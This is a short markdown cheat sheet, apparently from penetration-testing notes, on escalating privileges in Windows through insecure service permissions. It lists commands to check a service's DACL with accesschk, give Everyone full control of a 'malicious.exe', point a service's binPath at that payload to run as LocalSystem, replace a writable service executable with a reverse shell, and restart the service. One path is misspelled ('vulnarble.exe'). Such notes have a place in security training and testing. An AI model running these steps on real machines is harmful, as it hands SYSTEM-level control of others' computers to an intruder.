# Insecure Service Permissions

## Service permissions

Use the [Accesschk sysinternal](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to check for the service DACL:

```bash
accesschk64.exe -qlc VulnService
```

Grant permission to everyone to execute the payload

```powershell
icacls C:\path\to\malicious.exe /grant Everyone:F
```

Change the bin path in the service's config

```powershell
sc.exe config VulnService binPath= "C:\path\to\malicious.exe" obj= LocalSystem
```

## Service Executable Permissions

Look at the service executable path

```bash
sc qc VulnerableService
```

Check if you can modify the bin

```powershell
icacls c:\path\to\vulnerable.exe
```

Override the bin with a reverse shell

```powershell
move malicious.exe c:\path\to\vulnarble.exe
```

Restart if you can or wait for someone to restart it

```bash
sc stop VulnerableService
sc start VulnerableService
```
